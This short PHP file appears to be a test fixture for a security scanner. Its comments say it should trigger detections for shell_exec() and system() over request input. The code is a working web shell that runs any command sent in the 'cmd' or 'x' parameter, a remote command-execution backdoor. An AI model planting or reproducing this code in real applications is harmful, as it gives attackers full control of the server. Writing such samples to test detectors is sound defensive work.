<?php
// shell_exec / system / passthru over unsanitized HTTP input.
// Classic command-injection backdoor.
// Should trigger: shell_exec() over input, system() over input
if (isset($_REQUEST['cmd'])) {
    echo shell_exec($_REQUEST['cmd']);
}
if (isset($_GET['x'])) {
    system($_GET['x']);
}
?>
